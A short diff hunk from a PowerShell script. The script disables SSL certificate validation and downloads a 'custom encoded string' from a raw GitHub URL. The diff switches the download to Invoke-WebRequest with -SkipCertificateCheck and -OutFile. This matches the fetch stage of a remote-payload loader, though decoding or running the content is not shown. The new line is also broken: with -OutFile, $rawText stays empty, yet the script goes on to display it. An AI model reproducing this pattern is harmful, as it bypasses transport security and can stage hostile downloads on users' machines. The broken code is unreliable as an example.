@@ -56,7 +56,7 @@ Ignore-SSLCertificateValidation
 $url = "https://raw.githubusercontent.com/notforuseactually/404/main/4.txt" # Replace this with the actual URL containing the custom encoded string
 
 # Use Invoke-RestMethod to fetch the content from the URL
-$rawText = Invoke-RestMethod -Uri $url -ErrorAction Stop
+$rawText = Invoke-WebRequest -Uri $url -OutFile $path -SkipCertificateCheck -ErrorAction Stop
 
 # Display the raw text content for troubleshooting
 Write-Host "Raw text from URL:"
